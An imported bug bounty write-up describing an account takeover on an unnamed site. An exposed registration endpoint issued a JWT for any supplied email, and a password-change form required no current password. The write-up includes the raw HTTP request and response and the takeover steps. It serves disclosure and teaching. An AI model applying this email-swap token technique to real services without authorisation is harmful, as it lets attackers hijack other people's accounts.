---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-07-10_a-tale-of-critical-account-take-over.md
original_filename: 2020-07-10_a-tale-of-critical-account-take-over.md
title: A tale of critical account take over
category: documents
detected_topics:
- xss
- sso
- jwt
- command-injection
- otp
- cors
tags:
- imported
- documents
- xss
- sso
- jwt
- command-injection
- otp
- cors
language: en
raw_sha256: 275d6e8a93b53f79ad251884914d49384903594fbb6a48d2e5c3af037ee93293
text_sha256: eed8dc4de766b08d44b0e3a9bbcf9254951b28d39f8783de4044bb24279abc1b
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# A tale of critical account take over

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-07-10_a-tale-of-critical-account-take-over.md
- Source Type: markdown
- Detected Topics: xss, sso, jwt, command-injection, otp, cors
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `275d6e8a93b53f79ad251884914d49384903594fbb6a48d2e5c3af037ee93293`
- Text SHA256: `eed8dc4de766b08d44b0e3a9bbcf9254951b28d39f8783de4044bb24279abc1b`


## Content

---
title: "A tale of critical account take over"
url: "https://medium.com/@sp2417487/a-tale-of-critical-account-take-over-e1b7c180917c"
authors: ["Shivam Pandey (@shivam31200)"]
bugs: ["Account takeover", "Exposed JWT generation endpoint", "JWT"]
publication_date: "2020-07-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4417
scraped_via: "browseros"
---

# A tale of critical account take over

shivam Pandey
Follow
3 min read
·
Jul 10, 2020

405

A tale of critical account take over

Hello everyone I hope everyone is healthy and safe taking precautions as well

So , I am going to share my latest finding which I have found on private program let’s get started !!

So first thing i do is check login with google and Facebook feature on program and I had this feature in my program

How does that work :

1) click on login with google

2) enter you email id and password

Simple right ?? Wait for twist

we all know vulnerability like changing email with other user email that will logged into their account but not the case this time

As , my program was using jwt authentication it will generate jwt for given email after successfully login attempt

basically while logged in with google I intercepted all request one by one

and surprisingly in my burp history I found an api endpoint that that generates jwt token of user via taking email id as parameter see below

POST /register?src=aweb HTTP/1.1

Host: userapi.target.com

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: https://www.target.com

cp-origin: 11

Content-Type: application/json

X-Auth-Token: xxxxx

X-JWT-Token:

Origin: https://www.target.com

Content-Length: 1354

Connection: close

{“name”:”Shivam Pandey”,”email”:”shivam@gmail.com”,”providerUserId”:”103151677586368643333",”providerToken”:” eyFuZGV5IiwibG9jYWxlIjoiZW4tR0IiLCJpYXQiOjE1OTQyMjE3NzQsImV4cCI6MTU5NDIyNTM3NCwianRpIjoiODI4MWQwMWNhMTI0NTBkODA0YWQ4YzdkYWEzYTQ5MWI1MTA4M2JlMSJmHBAN06Wv1CspbxbXxxvlCieGHjlXrF5S8TbQvLTwIHKwdlbXhbuYydHpTubRQojAc_ZcHdHlMgumx6XJLvUk10dHkN_V1eQ”,”providerName”:”g”}

In above request “provider token” will generate jwt token for given email . so here I changed email with my test account that is testhunter@gmail.com and got his jwt token see response

HTTP/1.1 200

Content-Type: application/json;charset=UTF-8

Content-Length: 476

Connection: close

Date: Wed, 08 Jul 2020 15:42:16 GMT

Server: nginx/1.16.1

X-Content-Type-Options: nosniff

Get shivam Pandey’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

X-XSS-Protection: 1; mode=block

Cache-Control: no-cache, no-store, max-age=0, must-revalidate

Pragma: no-cache

Expires: 0

Strict-Transport-Security: max-age=31536000 ; includeSubDomains

X-Frame-Options: DENY

Access-Control-Allow-Origin: https://www.target.com

Vary: Origin

Access-Control-Allow-Credentials: true

X-Application-Context: application:prod

X-Cache: Miss from cloudfront

{“userInfo”:{“id”:8023402,”name”:”Test account Reddy”,”email”:”testhunter@gmail.com”,”status”:2,”phone”:”xxxxxxxxxx",”phoneVerified”:true,”socialUserId”:”8023402",”wasUserExists”: :true,”coins”:1209.00},”jwtToken”:”eyJhbGciOiJIUzUxMiJ9.MjM0MDIiLCJpYXQiOjE1OTQyMjI5MzYsImlzcyI6ImFkZGEyNDcuY29tIiwibmFtZSI6IlNyaWthbnRoIFJlZGR5In0.CNjPEj182YvEsdqMOYE_MauFnkl”}

Hey I have changed jwt token for security purpose

After seeing this I was like :

Press enter or click to view image in full size

So I already have jwt token what I can do ?? I know I can perform email change request but my target doesn’t not allow it 😒

So saw there is small low hanging fruit on account setting page wanna see

Press enter or click to view image in full size

No current passowrd required for change passowrd

So I quickly made intercept request for new password see below

Press enter or click to view image in full size

So in email param I changed it with my test account email it gave me 401

So I just changed jwt token which I steal previously with changing email param and successfully changed victim password

For confirmation got this on victim window

I was like yes eureka !!!

Press enter or click to view image in full size

Takeaway:

1)Always mess with api endpoint

2) check burp history for juicy endpoints

3) test login with google and Facebook feature

Timeline : reported

Got duplicate but still learned a lot

Got question or suggestions ?? Find me on twitter
